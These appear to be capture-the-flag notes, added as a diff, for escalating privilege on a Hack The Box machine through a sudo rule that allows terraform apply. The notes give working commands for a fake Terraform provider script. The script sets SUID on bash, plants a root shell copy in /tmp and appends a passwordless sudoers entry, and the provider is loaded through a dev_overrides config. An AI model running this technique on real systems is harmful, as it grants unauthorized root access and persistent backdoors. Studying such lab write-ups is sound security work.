@@ -1,0 +1,99 @@
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+--------------------------------------------------
+Terraform is an Infrastructure as Code (IaC) tool made by HashiCorp.
+
+Instead of manually creating servers, databases, and networks in AWS, Azure, GCP, etc.,
+→ you write configuration files (in a language called HCL – HashiCorp Configuration Language) that describe the infrastructure.
+
+Terraform then builds, changes, and destroys that infrastructure automatically.
+
+--------------------------------------------------
+
+1. cd /opt/examples && ls -al
+
+2. cat main.tf
+
+terraform {
+  required_providers {
+    examples = {
+      source = "previous.htb/terraform/examples"
+    }
+  }
+}
+variable "source_path" {
+  type = string
+  default = "/root/examples/hello-world.ts"
+  validation {
+    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
+    error_message = "The source_path must contain '/root/examples/'."
+  }
+}
+provider "examples" {}
+resource "examples_example" "example" {
+  source_path = var.source_path
+}
+output "destination_path" {
+  value = examples_example.example.destination_path
+
+Note: Terraform processes files from inside /root/examples/
+
+
+3. ls -la /opt
+
+
+So the path is: 
+1. We create a fake provider script at /tmp/terraform-provider-examples that sets SUID
+on /bin/bash , copies it to /tmp/rootbash , and adds our user to /etc/sudoers .
+2. We make it executable with chmod +x /tmp/terraform-provider-examples .
+3. We configure Terraform to load our provider by writing /tmp/terraform.rc with a
+dev_overrides entry pointing to /tmp .
+4. We set the config path: export TF_CLI_CONFIG_FILE=/tmp/terraform.rc .
+5. We run Terraform as root with sudo /usr/bin/terraform -chdir=/opt/examples apply .
+6. Terraform executes our malicious script as root, creating /tmp/rootbash .
+7. We launch a root shell with /tmp/rootbash -p .
+
+
+
+
+4. 
+cat > /tmp/terraform-provider-examples << 'EOF'
+#!/bin/bash
+# Malicious provider script
+chmod +s /bin/bash
+cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash
+echo 'jeremy ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo '{"malicious": "provider"}'
+EOF
+chmod +x /tmp/terraform-provider-examples
+export TF_CLI_CONFIG_FILE=/tmp/terraform.rc
+cat > /tmp/terraform.rc << 'EOF'
+provider_installation {
+dev_overrides {
+"previous.htb/terraform/examples" = "/tmp"
+}
+direct {}
+}
+EOF
+
+
+5. sudo /usr/bin/terraform -chdir=/opt/examples apply
+
+
+
+6. /tmp/rootbash -p
+
+7. cat /root/root.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
